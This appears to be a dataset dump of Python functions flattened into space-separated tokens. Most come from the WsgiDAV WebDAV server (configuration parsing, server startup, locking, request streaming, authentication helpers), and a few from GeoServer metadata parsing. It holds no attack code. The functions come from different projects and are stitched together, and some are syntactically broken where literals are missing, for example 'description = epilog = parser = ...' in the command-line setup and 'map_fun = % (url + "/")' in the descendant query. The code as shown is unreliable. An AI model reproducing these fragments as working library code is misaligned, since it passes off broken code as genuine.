def md_dimension_info ( name , node ) : def _get_value ( child_name ) : return getattr ( node . find ( child_name ) , 'text' , None ) resolution = _get_value ( 'resolution' ) defaultValue = node . find ( "defaultValue" ) strategy = defaultValue . find ( "strategy" ) if defaultValue is not None else None strategy = strategy . text if strategy is not None else None return DimensionInfo ( name , _get_value ( 'enabled' ) == 'true' , _get_value ( 'presentation' ) , int ( resolution ) if resolution else None , _get_value ( 'units' ) , _get_value ( 'unitSymbol' ) , strategy , _get_value ( 'attribute' ) , _get_value ( 'endAttribute' ) , _get_value ( 'referenceValue' ) , _get_value ( 'nearestMatchEnabled' ) )
def md_dynamic_default_values_info ( name , node ) : configurations = node . find ( "configurations" ) if configurations is not None : configurations = [ ] for n in node . findall ( "configuration" ) : dimension = n . find ( "dimension" ) dimension = dimension . text if dimension is not None else None policy = n . find ( "policy" ) policy = policy . text if policy is not None else None defaultValueExpression = n . find ( "defaultValueExpression" ) defaultValueExpression = defaultValueExpression . text if defaultValueExpression is not None else None configurations . append ( DynamicDefaultValuesConfiguration ( dimension , policy , defaultValueExpression ) ) return DynamicDefaultValues ( name , configurations )
def md_jdbc_virtual_table ( key , node ) : name = node . find ( "name" ) sql = node . find ( "sql" ) escapeSql = node . find ( "escapeSql" ) escapeSql = escapeSql . text if escapeSql is not None else None keyColumn = node . find ( "keyColumn" ) keyColumn = keyColumn . text if keyColumn is not None else None n_g = node . find ( "geometry" ) geometry = JDBCVirtualTableGeometry ( n_g . find ( "name" ) , n_g . find ( "type" ) , n_g . find ( "srid" ) ) parameters = [ ] for n_p in node . findall ( "parameter" ) : p_name = n_p . find ( "name" ) p_defaultValue = n_p . find ( "defaultValue" ) p_defaultValue = p_defaultValue . text if p_defaultValue is not None else None p_regexpValidator = n_p . find ( "regexpValidator" ) p_regexpValidator = p_regexpValidator . text if p_regexpValidator is not None else None parameters . append ( JDBCVirtualTableParam ( p_name , p_defaultValue , p_regexpValidator ) ) return JDBCVirtualTable ( name , sql , escapeSql , geometry , keyColumn , parameters )
def md_entry ( node ) : key = None value = None if 'key' in node . attrib : key = node . attrib [ 'key' ] else : key = None if key in [ 'time' , 'elevation' ] or key . startswith ( 'custom_dimension' ) : value = md_dimension_info ( key , node . find ( "dimensionInfo" ) ) elif key == 'DynamicDefaultValues' : value = md_dynamic_default_values_info ( key , node . find ( "DynamicDefaultValues" ) ) elif key == 'JDBC_VIRTUAL_TABLE' : value = md_jdbc_virtual_table ( key , node . find ( "virtualTable" ) ) else : value = node . text if None in [ key , value ] : return None else : return ( key , value )
def resolution_millis ( self ) : if self . resolution is None or not isinstance ( self . resolution , basestring ) : return self . resolution val , mult = self . resolution . split ( ' ' ) return int ( float ( val ) * self . _multipier ( mult ) * 1000 )
def as_DAVError ( e ) : if isinstance ( e , DAVError ) : return e elif isinstance ( e , Exception ) : # traceback.print_exc() return DAVError ( HTTP_INTERNAL_ERROR , src_exception = e ) else : return DAVError ( HTTP_INTERNAL_ERROR , "{}" . format ( e ) )
def get_user_info ( self ) : if self . value in ERROR_DESCRIPTIONS : s = "{}" . format ( ERROR_DESCRIPTIONS [ self . value ] ) else : s = "{}" . format ( self . value ) if self . context_info : s += ": {}" . format ( self . context_info ) elif self . value in ERROR_RESPONSES : s += ": {}" . format ( ERROR_RESPONSES [ self . value ] ) if self . src_exception : s += "\n    Source exception: '{}'" . format ( self . src_exception ) if self . err_condition : s += "\n    Error condition: '{}'" . format ( self . err_condition ) return s
def handle_delete ( self ) : # DELETE is only supported for the '/by_tag/' collection if "/by_tag/" not in self . path : raise DAVError ( HTTP_FORBIDDEN ) # path must be '/by_tag/<tag>/<resname>' catType , tag , _rest = util . save_split ( self . path . strip ( "/" ) , "/" , 2 ) assert catType == "by_tag" assert tag in self . data [ "tags" ] self . data [ "tags" ] . remove ( tag ) return True
def handle_copy ( self , dest_path , depth_infinity ) : # destPath must be '/by_tag/<tag>/<resname>' if "/by_tag/" not in dest_path : raise DAVError ( HTTP_FORBIDDEN ) catType , tag , _rest = util . save_split ( dest_path . strip ( "/" ) , "/" , 2 ) assert catType == "by_tag" if tag not in self . data [ "tags" ] : self . data [ "tags" ] . append ( tag ) return True
def handle_move ( self , dest_path ) : # path and destPath must be '/by_tag/<tag>/<resname>' if "/by_tag/" not in self . path : raise DAVError ( HTTP_FORBIDDEN ) if "/by_tag/" not in dest_path : raise DAVError ( HTTP_FORBIDDEN ) catType , tag , _rest = util . save_split ( self . path . strip ( "/" ) , "/" , 2 ) assert catType == "by_tag" assert tag in self . data [ "tags" ] self . data [ "tags" ] . remove ( tag ) catType , tag , _rest = util . save_split ( dest_path . strip ( "/" ) , "/" , 2 ) assert catType == "by_tag" if tag not in self . data [ "tags" ] : self . data [ "tags" ] . append ( tag ) return True
def add_provider ( self , share , provider , readonly = False ) : # Make sure share starts with, or is '/' share = "/" + share . strip ( "/" ) assert share not in self . provider_map if compat . is_basestring ( provider ) : # Syntax: #   <mount_path>: <folder_path> # We allow a simple string as 'provider'. In this case we interpret # it as a file system root folder that is published. provider = FilesystemProvider ( provider , readonly ) elif type ( provider ) in ( dict , ) : if "provider" in provider : # Syntax: #   <mount_path>: {"provider": <class_path>, "args": <pos_args>, "kwargs": <named_args} prov_class = dynamic_import_class ( provider [ "provider" ] ) provider = prov_class ( * provider . get ( "args" , [ ] ) , * * provider . get ( "kwargs" , { } ) ) else : # Syntax: #   <mount_path>: {"root": <path>, "redaonly": <bool>} provider = FilesystemProvider ( provider [ "root" ] , bool ( provider . get ( "readonly" , False ) ) ) elif type ( provider ) in ( list , tuple ) : raise ValueError ( "Provider {}: tuple/list syntax is no longer supported" . format ( provider ) ) # provider = FilesystemProvider(provider[0], provider[1]) if not isinstance ( provider , DAVProvider ) : raise ValueError ( "Invalid provider {}" . format ( provider ) ) provider . set_share_path ( share ) if self . mount_path : provider . set_mount_path ( self . mount_path ) # TODO: someday we may want to configure different lock/prop # managers per provider provider . set_lock_manager ( self . lock_manager ) provider . set_prop_manager ( self . prop_manager ) self . provider_map [ share ] = provider # self.provider_map[share] = {"provider": provider, "allow_anonymous": False} # Store the list of share paths, ordered by length, so route lookups # will return the most specific match self . sorted_share_list = [ s . lower ( ) for s in self . provider_map . keys ( ) ] self . sorted_share_list = sorted ( self . sorted_share_list , key = len , reverse = True ) return provider
def read ( self , size = None ) : while size is None or len ( self . buffer ) < size : try : self . buffer += next ( self . data_stream ) except StopIteration : break sized_chunk = self . buffer [ : size ] if size is None : self . buffer = "" else : self . buffer = self . buffer [ size : ] return sized_chunk
def handle_copy ( self , dest_path , depth_infinity ) : destType , destHgPath = util . pop_path ( dest_path ) destHgPath = destHgPath . strip ( "/" ) ui = self . provider . ui repo = self . provider . repo _logger . info ( "handle_copy %s -> %s" % ( self . localHgPath , destHgPath ) ) if self . rev is None and destType == "edit" : # COPY /edit/a/b to /edit/c/d: turn into 'hg copy -f a/b c/d' commands . copy ( ui , repo , self . localHgPath , destHgPath , force = True ) elif self . rev is None and destType == "released" : # COPY /edit/a/b to /released/c/d # This is interpreted as 'hg commit a/b' (ignoring the dest. path) self . _commit ( "WsgiDAV commit (COPY %s -> %s)" % ( self . path , dest_path ) ) else : raise DAVError ( HTTP_FORBIDDEN ) # Return True: request was handled return True
def _get_log ( self , limit = None ) : self . ui . pushbuffer ( ) commands . log ( self . ui , self . repo , limit = limit , date = None , rev = None , user = None ) res = self . ui . popbuffer ( ) . strip ( ) logList = [ ] for logentry in res . split ( "\n\n" ) : log = { } logList . append ( log ) for line in logentry . split ( "\n" ) : k , v = line . split ( ":" , 1 ) assert k in ( "changeset" , "tag" , "user" , "date" , "summary" ) log [ k . strip ( ) ] = v . strip ( ) log [ "parsed_date" ] = util . parse_time_string ( log [ "date" ] ) local_id , unid = log [ "changeset" ] . split ( ":" ) log [ "local_id" ] = int ( local_id ) log [ "unid" ] = unid #        pprint(logList) return logList
def remove_all_properties ( self , recursive ) : if self . provider . prop_manager : self . provider . prop_manager . remove_properties ( self . get_ref_url ( ) , self . environ )
def is_locked ( self ) : if self . provider . lock_manager is None : return False return self . provider . lock_manager . is_url_locked ( self . get_ref_url ( ) )
def string_to_xml ( text ) : try : return etree . XML ( text ) except Exception : # TODO: # ExpatError: reference to invalid character number: line 1, column 62 # litmus fails, when xml is used instead of lxml # 18. propget............... FAIL (PROPFIND on `/temp/litmus/prop2': #   Could not read status line: connection was closed by server) # text = <ns0:high-unicode xmlns:ns0="http://example.com/neon/litmus/">&#55296;&#56320; #   </ns0:high-unicode> #        t2 = text.encode("utf8") #        return etree.XML(t2) _logger . error ( "Error parsing XML string. " "If lxml is not available, and unicode is involved, then " "installing lxml _may_ solve this issue." ) _logger . error ( "XML source: {}" . format ( text ) ) raise
def make_sub_element ( parent , tag , nsmap = None ) : if use_lxml : return etree . SubElement ( parent , tag , nsmap = nsmap ) return etree . SubElement ( parent , tag )
def _get_checked_path ( path , config , must_exist = True , allow_none = True ) : if path in ( None , "" ) : if allow_none : return None raise ValueError ( "Invalid path {!r}" . format ( path ) ) # Evaluate path relative to the folder of the config file (if any) config_file = config . get ( "_config_file" ) if config_file and not os . path . isabs ( path ) : path = os . path . normpath ( os . path . join ( os . path . dirname ( config_file ) , path ) ) else : path = os . path . abspath ( path ) if must_exist and not os . path . exists ( path ) : raise ValueError ( "Invalid path {!r}" . format ( path ) ) return path
def _init_command_line_options ( ) : description = epilog = parser = argparse . ArgumentParser ( prog = "wsgidav" , description = description , epilog = epilog , # allow_abbrev=False,  # Py3.5+ formatter_class = argparse . RawTextHelpFormatter , ) parser . add_argument ( "-p" , "--port" , dest = "port" , type = int , # default=8080, help = "port to serve on (default: 8080)" , ) parser . add_argument ( "-H" , # '-h' conflicts with --help "--host" , dest = "host" , help = ( "host to serve from (default: localhost). 'localhost' is only " "accessible from the local computer. Use 0.0.0.0 to make your " "application public" ) , ) , parser . add_argument ( "-r" , "--root" , dest = "root_path" , action = FullExpandedPath , help = "path to a file system folder to publish as share '/'." , ) parser . add_argument ( "--auth" , choices = ( "anonymous" , "nt" , "pam-login" ) , help = "quick configuration of a domain controller when no config file " "is used" , ) parser . add_argument ( "--server" , choices = SUPPORTED_SERVERS . keys ( ) , # default="cheroot", help = "type of pre-installed WSGI server to use (default: cheroot)." , ) parser . add_argument ( "--ssl-adapter" , choices = ( "builtin" , "pyopenssl" ) , # default="builtin", help = "used by 'cheroot' server if SSL certificates are configured " "(default: builtin)." , ) qv_group = parser . add_mutually_exclusive_group ( ) qv_group . add_argument ( "-v" , "--verbose" , action = "count" , default = 3 , help = "increment verbosity by one (default: %(default)s, range: 0..5)" , ) qv_group . add_argument ( "-q" , "--quiet" , default = 0 , action = "count" , help = "decrement verbosity by one" ) qv_group = parser . add_mutually_exclusive_group ( ) qv_group . add_argument ( "-c" , "--config" , dest = "config_file" , action = FullExpandedPath , help = ( "configuration file (default: {} in current directory)" . format ( DEFAULT_CONFIG_FILES ) ) , ) qv_group . add_argument ( "--no-config" , action = "store_true" , dest = "no_config" , help = "do not try to load default {}" . format ( DEFAULT_CONFIG_FILES ) , ) parser . add_argument ( "-V" , "--version" , action = "store_true" , help = "print version info and exit (may be combined with --verbose)" , ) args = parser . parse_args ( ) args . verbose -= args . quiet del args . quiet if args . root_path and not os . path . isdir ( args . root_path ) : msg = "{} is not a directory" . format ( args . root_path ) raise parser . error ( msg ) if args . version : if args . verbose >= 4 : msg = "WsgiDAV/{} Python/{} {}" . format ( __version__ , util . PYTHON_VERSION , platform . platform ( aliased = True ) ) else : msg = "{}" . format ( __version__ ) print ( msg ) sys . exit ( ) if args . no_config : pass # ... else ignore default config files elif args . config_file is None : # If --config was omitted, use default (if it exists) for filename in DEFAULT_CONFIG_FILES : defPath = os . path . abspath ( filename ) if os . path . exists ( defPath ) : if args . verbose >= 3 : print ( "Using default configuration file: {}" . format ( defPath ) ) args . config_file = defPath break else : # If --config was specified convert to absolute path and assert it exists args . config_file = os . path . abspath ( args . config_file ) if not os . path . isfile ( args . config_file ) : parser . error ( "Could not find specified configuration file: {}" . format ( args . config_file ) ) # Convert args object to dictionary cmdLineOpts = args . __dict__ . copy ( ) if args . verbose >= 5 : print ( "Command line args:" ) for k , v in cmdLineOpts . items ( ) : print ( "    {:>12}: {}" . format ( k , v ) ) return cmdLineOpts , parser
def _read_config_file ( config_file , verbose ) : config_file = os . path . abspath ( config_file ) if not os . path . exists ( config_file ) : raise RuntimeError ( "Couldn't open configuration file '{}'." . format ( config_file ) ) if config_file . endswith ( ".json" ) : with io . open ( config_file , mode = "r" , encoding = "utf-8" ) as json_file : # Minify the JSON file to strip embedded comments minified = jsmin ( json_file . read ( ) ) conf = json . loads ( minified ) elif config_file . endswith ( ".yaml" ) : with io . open ( config_file , mode = "r" , encoding = "utf-8" ) as yaml_file : conf = yaml . safe_load ( yaml_file ) else : try : import imp conf = { } configmodule = imp . load_source ( "configuration_module" , config_file ) for k , v in vars ( configmodule ) . items ( ) : if k . startswith ( "__" ) : continue elif isfunction ( v ) : continue conf [ k ] = v except Exception : exc_type , exc_value = sys . exc_info ( ) [ : 2 ] exc_info_list = traceback . format_exception_only ( exc_type , exc_value ) exc_text = "\n" . join ( exc_info_list ) print ( "Failed to read configuration file: " + config_file + "\nDue to " + exc_text , file = sys . stderr , ) raise conf [ "_config_file" ] = config_file return conf
def _init_config ( ) : cli_opts , parser = _init_command_line_options ( ) cli_verbose = cli_opts [ "verbose" ] # Set config defaults config = copy . deepcopy ( DEFAULT_CONFIG ) # Configuration file overrides defaults config_file = cli_opts . get ( "config_file" ) if config_file : file_opts = _read_config_file ( config_file , cli_verbose ) util . deep_update ( config , file_opts ) if cli_verbose != DEFAULT_VERBOSE and "verbose" in file_opts : if cli_verbose >= 2 : print ( "Config file defines 'verbose: {}' but is overridden by command line: {}." . format ( file_opts [ "verbose" ] , cli_verbose ) ) config [ "verbose" ] = cli_verbose else : if cli_verbose >= 2 : print ( "Running without configuration file." ) # Command line overrides file if cli_opts . get ( "port" ) : config [ "port" ] = cli_opts . get ( "port" ) if cli_opts . get ( "host" ) : config [ "host" ] = cli_opts . get ( "host" ) if cli_opts . get ( "profile" ) is not None : config [ "profile" ] = True if cli_opts . get ( "server" ) is not None : config [ "server" ] = cli_opts . get ( "server" ) if cli_opts . get ( "ssl_adapter" ) is not None : config [ "ssl_adapter" ] = cli_opts . get ( "ssl_adapter" ) # Command line overrides file only if -v or -q where passed: if cli_opts . get ( "verbose" ) != DEFAULT_VERBOSE : config [ "verbose" ] = cli_opts . get ( "verbose" ) if cli_opts . get ( "root_path" ) : root_path = os . path . abspath ( cli_opts . get ( "root_path" ) ) config [ "provider_mapping" ] [ "/" ] = FilesystemProvider ( root_path ) if config [ "verbose" ] >= 5 : # TODO: remove passwords from user_mapping # config_cleaned = copy.deepcopy(config) print ( "Configuration({}):\n{}" . format ( cli_opts [ "config_file" ] , pformat ( config ) ) ) if not config [ "provider_mapping" ] : parser . error ( "No DAV provider defined." ) # Quick-configuration of DomainController auth = cli_opts . get ( "auth" ) auth_conf = config . get ( "http_authenticator" , { } ) if auth and auth_conf . get ( "domain_controller" ) : parser . error ( "--auth option can only be used when no domain_controller is configured" ) if auth == "anonymous" : if config [ "simple_dc" ] [ "user_mapping" ] : parser . error ( "--auth=anonymous can only be used when no user_mapping is configured" ) auth_conf . update ( { "domain_controller" : "wsgidav.dc.simple_dc.SimpleDomainController" , "accept_basic" : True , "accept_digest" : True , "default_to_digest" : True , } ) config [ "simple_dc" ] [ "user_mapping" ] = { "*" : True } elif auth == "nt" : if config . get ( "nt_dc" ) : parser . error ( "--auth=nt can only be used when no nt_dc settings are configured" ) auth_conf . update ( { "domain_controller" : "wsgidav.dc.nt_dc.NTDomainController" , "accept_basic" : True , "accept_digest" : False , "default_to_digest" : False , } ) config [ "nt_dc" ] = { } elif auth == "pam-login" : if config . get ( "pam_dc" ) : parser . error ( "--auth=pam-login can only be used when no pam_dc settings are configured" ) auth_conf . update ( { "domain_controller" : "wsgidav.dc.pam_dc.PAMDomainController" , "accept_basic" : True , "accept_digest" : False , "default_to_digest" : False , } ) config [ "pam_dc" ] = { "service" : "login" } # print(config) if cli_opts . get ( "reload" ) : print ( "Installing paste.reloader." , file = sys . stderr ) from paste import reloader # @UnresolvedImport reloader . install ( ) if config_file : # Add config file changes reloader . watch_file ( config_file ) # import pydevd # pydevd.settrace() return config
def _run__cherrypy ( app , config , mode ) : assert mode == "cherrypy-wsgiserver" try : from cherrypy import wsgiserver from cherrypy . wsgiserver . ssl_builtin import BuiltinSSLAdapter _logger . warning ( "WARNING: cherrypy.wsgiserver is deprecated." ) _logger . warning ( "         Starting with CherryPy 9.0 the functionality from cherrypy.wsgiserver" ) _logger . warning ( "         was moved to the cheroot project." ) _logger . warning ( "         Consider using --server=cheroot." ) except ImportError : _logger . error ( "*" * 78 ) _logger . error ( "ERROR: Could not import cherrypy.wsgiserver." ) _logger . error ( "Try `pip install cherrypy` or specify another server using the --server option." ) _logger . error ( "Note that starting with CherryPy 9.0, the server was moved to" ) _logger . error ( "the cheroot project, so it is recommended to use `-server=cheroot`" ) _logger . error ( "and run `pip install cheroot` instead." ) _logger . error ( "*" * 78 ) raise server_name = "WsgiDAV/{} {} Python/{}" . format ( __version__ , wsgiserver . CherryPyWSGIServer . version , util . PYTHON_VERSION ) wsgiserver . CherryPyWSGIServer . version = server_name # Support SSL ssl_certificate = _get_checked_path ( config . get ( "ssl_certificate" ) , config ) ssl_private_key = _get_checked_path ( config . get ( "ssl_private_key" ) , config ) ssl_certificate_chain = _get_checked_path ( config . get ( "ssl_certificate_chain" ) , config ) protocol = "http" if ssl_certificate : assert ssl_private_key wsgiserver . CherryPyWSGIServer . ssl_adapter = BuiltinSSLAdapter ( ssl_certificate , ssl_private_key , ssl_certificate_chain ) protocol = "https" _logger . info ( "SSL / HTTPS enabled." ) _logger . info ( "Running {}" . format ( server_name ) ) _logger . info ( "Serving on {}://{}:{} ..." . format ( protocol , config [ "host" ] , config [ "port" ] ) ) server_args = { "bind_addr" : ( config [ "host" ] , config [ "port" ] ) , "wsgi_app" : app , "server_name" : server_name , } # Override or add custom args server_args . update ( config . get ( "server_args" , { } ) ) server = wsgiserver . CherryPyWSGIServer ( * * server_args ) # If the caller passed a startup event, monkey patch the server to set it # when the request handler loop is entered startup_event = config . get ( "startup_event" ) if startup_event : def _patched_tick ( ) : server . tick = org_tick # undo the monkey patch org_tick ( ) _logger . info ( "CherryPyWSGIServer is ready" ) startup_event . set ( ) org_tick = server . tick server . tick = _patched_tick try : server . start ( ) except KeyboardInterrupt : _logger . warning ( "Caught Ctrl-C, shutting down..." ) finally : server . stop ( ) return
def _run_cheroot ( app , config , mode ) : assert mode == "cheroot" try : from cheroot import server , wsgi #         from cheroot.ssl.builtin import BuiltinSSLAdapter #         import cheroot.ssl.pyopenssl except ImportError : _logger . error ( "*" * 78 ) _logger . error ( "ERROR: Could not import Cheroot." ) _logger . error ( "Try `pip install cheroot` or specify another server using the --server option." ) _logger . error ( "*" * 78 ) raise server_name = "WsgiDAV/{} {} Python/{}" . format ( __version__ , wsgi . Server . version , util . PYTHON_VERSION ) wsgi . Server . version = server_name # Support SSL ssl_certificate = _get_checked_path ( config . get ( "ssl_certificate" ) , config ) ssl_private_key = _get_checked_path ( config . get ( "ssl_private_key" ) , config ) ssl_certificate_chain = _get_checked_path ( config . get ( "ssl_certificate_chain" ) , config ) ssl_adapter = config . get ( "ssl_adapter" , "builtin" ) protocol = "http" if ssl_certificate and ssl_private_key : ssl_adapter = server . get_ssl_adapter_class ( ssl_adapter ) wsgi . Server . ssl_adapter = ssl_adapter ( ssl_certificate , ssl_private_key , ssl_certificate_chain ) protocol = "https" _logger . info ( "SSL / HTTPS enabled. Adapter: {}" . format ( ssl_adapter ) ) elif ssl_certificate or ssl_private_key : raise RuntimeError ( "Option 'ssl_certificate' and 'ssl_private_key' must be used together." ) #     elif ssl_adapter: #         print("WARNING: Ignored option 'ssl_adapter' (requires 'ssl_certificate').") _logger . info ( "Running {}" . format ( server_name ) ) _logger . info ( "Serving on {}://{}:{} ..." . format ( protocol , config [ "host" ] , config [ "port" ] ) ) server_args = { "bind_addr" : ( config [ "host" ] , config [ "port" ] ) , "wsgi_app" : app , "server_name" : server_name , } # Override or add custom args server_args . update ( config . get ( "server_args" , { } ) ) server = wsgi . Server ( * * server_args ) # If the caller passed a startup event, monkey patch the server to set it # when the request handler loop is entered startup_event = config . get ( "startup_event" ) if startup_event : def _patched_tick ( ) : server . tick = org_tick # undo the monkey patch _logger . info ( "wsgi.Server is ready" ) startup_event . set ( ) org_tick ( ) org_tick = server . tick server . tick = _patched_tick try : server . start ( ) except KeyboardInterrupt : _logger . warning ( "Caught Ctrl-C, shutting down..." ) finally : server . stop ( ) return
def _run_flup ( app , config , mode ) : # http://trac.saddi.com/flup/wiki/FlupServers if mode == "flup-fcgi" : from flup . server . fcgi import WSGIServer , __version__ as flupver elif mode == "flup-fcgi-fork" : from flup . server . fcgi_fork import WSGIServer , __version__ as flupver else : raise ValueError _logger . info ( "Running WsgiDAV/{} {}/{}..." . format ( __version__ , WSGIServer . __module__ , flupver ) ) server = WSGIServer ( app , bindAddress = ( config [ "host" ] , config [ "port" ] ) , # debug=True, ) try : server . run ( ) except KeyboardInterrupt : _logger . warning ( "Caught Ctrl-C, shutting down..." ) return
def _run_wsgiref ( app , config , mode ) : # http://www.python.org/doc/2.5.2/lib/module-wsgiref.html from wsgiref . simple_server import make_server , software_version version = "WsgiDAV/{} {}" . format ( __version__ , software_version ) _logger . info ( "Running {}..." . format ( version ) ) _logger . warning ( "WARNING: This single threaded server (wsgiref) is not meant for production." ) httpd = make_server ( config [ "host" ] , config [ "port" ] , app ) try : httpd . serve_forever ( ) except KeyboardInterrupt : _logger . warning ( "Caught Ctrl-C, shutting down..." ) return
def _run_ext_wsgiutils ( app , config , mode ) : from wsgidav . server import ext_wsgiutils_server _logger . info ( "Running WsgiDAV {} on wsgidav.ext_wsgiutils_server..." . format ( __version__ ) ) _logger . warning ( "WARNING: This single threaded server (ext-wsgiutils) is not meant for production." ) try : ext_wsgiutils_server . serve ( config , app ) except KeyboardInterrupt : _logger . warning ( "Caught Ctrl-C, shutting down..." ) return
def _stream_data_chunked ( self , environ , block_size ) : # Chunked Transfer Coding # http://www.servlets.com/rfcs/rfc2616-sec3.html#sec3.6.1 if "Darwin" in environ . get ( "HTTP_USER_AGENT" , "" ) and environ . get ( "HTTP_X_EXPECTED_ENTITY_LENGTH" ) : # Mac Finder, that does not prepend chunk-size + CRLF , # like it should to comply with the spec. It sends chunk # size as integer in a HTTP header instead. WORKAROUND_CHUNK_LENGTH = True buf = environ . get ( "HTTP_X_EXPECTED_ENTITY_LENGTH" , "0" ) length = int ( buf ) else : WORKAROUND_CHUNK_LENGTH = False buf = environ [ "wsgi.input" ] . readline ( ) environ [ "wsgidav.some_input_read" ] = 1 if buf == compat . b_empty : length = 0 else : length = int ( buf , 16 ) while length > 0 : buf = environ [ "wsgi.input" ] . read ( block_size ) yield buf if WORKAROUND_CHUNK_LENGTH : environ [ "wsgidav.some_input_read" ] = 1 # Keep receiving until we read expected size or reach # EOF if buf == compat . b_empty : length = 0 else : length -= len ( buf ) else : environ [ "wsgi.input" ] . readline ( ) buf = environ [ "wsgi.input" ] . readline ( ) if buf == compat . b_empty : length = 0 else : length = int ( buf , 16 ) environ [ "wsgidav.all_input_read" ] = 1
def _stream_data ( self , environ , content_length , block_size ) : if content_length == 0 : # TODO: review this # XP and Vista MiniRedir submit PUT with Content-Length 0, # before LOCK and the real PUT. So we have to accept this. _logger . info ( "PUT: Content-Length == 0. Creating empty file..." ) #        elif content_length < 0: #            # TODO: review this #            # If CONTENT_LENGTH is invalid, we may try to workaround this #            # by reading until the end of the stream. This may block however! #            # The iterator produced small chunks of varying size, but not #            # sure, if we always get everything before it times out. #            _logger.warning("PUT with invalid Content-Length (%s). " #                            "Trying to read all (this may timeout)..." #                            .format(environ.get("CONTENT_LENGTH"))) #            nb = 0 #            try: #                for s in environ["wsgi.input"]: #                    environ["wsgidav.some_input_read"] = 1 #                    _logger.debug("PUT: read from wsgi.input.__iter__, len=%s" % len(s)) #                    yield s #                    nb += len (s) #            except socket.timeout: #                _logger.warning("PUT: input timed out after writing %s bytes" % nb) #                hasErrors = True else : assert content_length > 0 contentremain = content_length while contentremain > 0 : n = min ( contentremain , block_size ) readbuffer = environ [ "wsgi.input" ] . read ( n ) # This happens with litmus expect-100 test: if not len ( readbuffer ) > 0 : _logger . error ( "input.read({}) returned 0 bytes" . format ( n ) ) break environ [ "wsgidav.some_input_read" ] = 1 yield readbuffer contentremain -= len ( readbuffer ) if contentremain == 0 : environ [ "wsgidav.all_input_read" ] = 1
def _find ( self , url ) : # Query the permanent view to find a url vr = self . db . view ( "properties/by_url" , key = url , include_docs = True ) _logger . debug ( "find(%r) returned %s" % ( url , len ( vr ) ) ) assert len ( vr ) <= 1 , "Found multiple matches for %r" % url for row in vr : assert row . doc return row . doc return None
def _find_descendents ( self , url ) : # Ad-hoc query for URL starting with a prefix map_fun = % ( url + "/" ) vr = self . db . query ( map_fun , include_docs = True ) for row in vr : yield row . doc return
def get_domain_realm ( self , path_info , environ ) : realm = self . _calc_realm_from_path_provider ( path_info , environ ) return realm
def digest_auth_user ( self , realm , user_name , environ ) : user = self . _get_realm_entry ( realm , user_name ) if user is None : return False password = user . get ( "password" ) environ [ "wsgidav.auth.roles" ] = user . get ( "roles" , [ ] ) return self . _compute_http_digest_a1 ( realm , user_name , password )
def _flush ( self ) : _logger . debug ( "_flush()" ) self . _lock . acquire_write ( ) # TODO: read access is enough? try : self . _dict . sync ( ) finally : self . _lock . release ( )
def clear ( self ) : self . _lock . acquire_write ( ) # TODO: read access is enough? try : was_closed = self . _dict is None if was_closed : self . open ( ) if len ( self . _dict ) : self . _dict . clear ( ) self . _dict . sync ( ) if was_closed : self . close ( ) finally : self . _lock . release ( )
def set_last_modified ( self , dest_path , time_stamp , dry_run ) : # Translate time from RFC 1123 to seconds since epoch format secs = util . parse_time_string ( time_stamp ) if not dry_run : os . utime ( self . _file_path , ( secs , secs ) ) return True
def lock_string ( lock_dict ) : if not lock_dict : return "Lock: None" if lock_dict [ "expire" ] < 0 : expire = "Infinite ({})" . format ( lock_dict [ "expire" ] ) else : expire = "{} (in {} seconds)" . format ( util . get_log_time ( lock_dict [ "expire" ] ) , lock_dict [ "expire" ] - time . time ( ) ) return "Lock(<{}..>, '{}', {}, {}, depth-{}, until {}" . format ( # first 4 significant token characters lock_dict . get ( "token" , "?" * 30 ) [ 18 : 22 ] , lock_dict . get ( "root" ) , lock_dict . get ( "principal" ) , lock_dict . get ( "scope" ) , lock_dict . get ( "depth" ) , expire , )
def refresh ( self , token , timeout = None ) : if timeout is None : timeout = LockManager . LOCK_TIME_OUT_DEFAULT return self . storage . refresh ( token , timeout )
def _sync ( self ) : _logger . debug ( "_sync()" ) self . _lock . acquire_write ( ) # TODO: read access is enough? try : if self . _loaded : self . _dict . sync ( ) finally : self . _lock . release ( )
def dynamic_import_class ( name ) : import importlib module_name , class_name = name . rsplit ( "." , 1 ) try : module = importlib . import_module ( module_name ) except Exception as e : _logger . exception ( "Dynamic import of {!r} failed: {}" . format ( name , e ) ) raise the_class = getattr ( module , class_name ) return the_class
def string_repr ( s ) : if compat . is_bytes ( s ) : res = "{!r}: " . format ( s ) for b in s : if type ( b ) is str : # Py2 b = ord ( b ) res += "%02x " % b return res return "{}" . format ( s )
def byte_number_string ( number , thousandsSep = True , partition = False , base1024 = True , appendBytes = True ) : magsuffix = "" bytesuffix = "" if partition : magnitude = 0 if base1024 : while number >= 1024 : magnitude += 1 number = number >> 10 else : while number >= 1000 : magnitude += 1 number /= 1000.0 # TODO: use "9 KB" instead of "9K Bytes"? # TODO use 'kibi' for base 1024? # http://en.wikipedia.org/wiki/Kibi-#IEC_standard_prefixes magsuffix = [ "" , "K" , "M" , "G" , "T" , "P" ] [ magnitude ] if appendBytes : if number == 1 : bytesuffix = " Byte" else : bytesuffix = " Bytes" if thousandsSep and ( number >= 1000 or magsuffix ) : # locale.setlocale(locale.LC_ALL, "") # # TODO: make precision configurable # snum = locale.format("%d", number, thousandsSep) snum = "{:,d}" . format ( number ) else : snum = str ( number ) return "{}{}{}" . format ( snum , magsuffix , bytesuffix )
def send_status_response ( environ , start_response , e , add_headers = None , is_head = False ) : status = get_http_status_string ( e ) headers = [ ] if add_headers : headers . extend ( add_headers ) #    if 'keep-alive' in environ.get('HTTP_CONNECTION', '').lower(): #        headers += [ #            ('Connection', 'keep-alive'), #        ] if e in ( HTTP_NOT_MODIFIED , HTTP_NO_CONTENT ) : # See paste.lint: these code don't have content start_response ( status , [ ( "Content-Length" , "0" ) , ( "Date" , get_rfc1123_time ( ) ) ] + headers ) return [ b"" ] if e in ( HTTP_OK , HTTP_CREATED ) : e = DAVError ( e ) assert isinstance ( e , DAVError ) content_type , body = e . get_response_page ( ) if is_head : body = compat . b_empty assert compat . is_bytes ( body ) , body # If not, Content-Length is wrong! start_response ( status , [ ( "Content-Type" , content_type ) , ( "Date" , get_rfc1123_time ( ) ) , ( "Content-Length" , str ( len ( body ) ) ) , ] + headers , ) return [ body ]
def calc_base64 ( s ) : s = compat . to_bytes ( s ) s = compat . base64_encodebytes ( s ) . strip ( ) # return bytestring return compat . to_native ( s )
